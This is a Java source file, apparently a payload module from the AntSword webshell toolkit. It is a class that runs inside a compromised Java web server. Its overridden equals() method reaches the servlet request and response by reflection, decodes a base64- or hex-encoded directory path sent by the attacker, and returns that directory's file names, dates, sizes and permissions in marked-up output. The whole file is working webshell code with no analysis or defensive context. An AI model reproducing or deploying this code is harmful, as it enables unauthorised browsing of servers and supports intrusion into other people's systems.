import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFileAttributes;
import java.nio.file.attribute.PosixFilePermission;
import java.text.SimpleDateFormat;
import java.util.Set;

public class Dir {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        if (obj instanceof PageContext) {
            PageContext page = (PageContext) obj;
            request = (HttpServletRequest) page.getRequest();
            response = (HttpServletResponse) page.getResponse();
        } else if (obj instanceof HttpServletRequest) {
            request = (HttpServletRequest) obj;
            try {
                Field req = request.getClass().getDeclaredField("request");
                req.setAccessible(true);
                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                Field resp = request2.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                response = (HttpServletResponse) resp.get(request2);
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else if (obj instanceof HttpServletResponse) {
            response = (HttpServletResponse) obj;
            try {
                Field resp = response.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                Field req = response2.getClass().getDeclaredField("request");
                req.setAccessible(true);
                request = (HttpServletRequest) req.get(response2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargpath";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + ""));
            output.append(tag_s);
            sb.append(FileTreeCode(z1));
            output.append(sb.toString());
            output.append(tag_e);
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s) throws Exception {
        if (encoder.equals("hex")) return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            String version = System.getProperty("java.version");
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new Object[]{});
                bt = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.getDeclaredConstructor().newInstance();
                bt = (byte[]) Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
            }

            return new String(bt, "UTF-8");
        }
        return str;
    }

    String FileTreeCode(String dirPath) throws Exception {
        File oF = new File(dirPath), l[] = oF.listFiles();
        String s = "", sT, sQ, sF = "";
        java.util.Date dt;
        String fileCode = (String) System.getProperties().get("file.encoding");
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            if (isWin()) {
                sQ = l[i].canRead() ? "R" : "-";
                sQ += l[i].canWrite() ? "W" : "-";
                sQ += l[i].canExecute() ? "X" : "-";
            } else {
                sQ = getPosixFilePermissions(l[i].toString());
            }
            String nm = new String(l[i].getName().getBytes(fileCode), cs);
            if (l[i].isDirectory()) {
                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            } else {
                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            }
        }
        s += sF;
        return new String(s.getBytes(fileCode), cs);
    }

    String getPosixFilePermissions(String sourceFile) {
        int ownerPermissions = 0;
        int groupPermissions = 0;
        int othersPermissions = 0;
        try {
            Path path = Paths.get(sourceFile);
            PosixFileAttributes attr;
            attr = Files.readAttributes(path, PosixFileAttributes.class, LinkOption.NOFOLLOW_LINKS);
            Set<PosixFilePermission> filePermissions = attr.permissions();

            if (filePermissions.contains(PosixFilePermission.OWNER_READ)) {
                ownerPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.OWNER_WRITE)) {
                ownerPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.OWNER_EXECUTE)) {
                ownerPermissions += 1;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_READ)) {
                groupPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_WRITE)) {
                groupPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_EXECUTE)) {
                groupPermissions += 1;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_READ)) {
                othersPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_WRITE)) {
                othersPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_EXECUTE)) {
                othersPermissions += 1;
            }
        } catch (Exception ioe) {
            return "0000";
        }
        return "0" + String.valueOf(ownerPermissions) + String.valueOf(groupPermissions)
                + String.valueOf(othersPermissions);
    }

    boolean isWin() {
        String osname = System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }
}
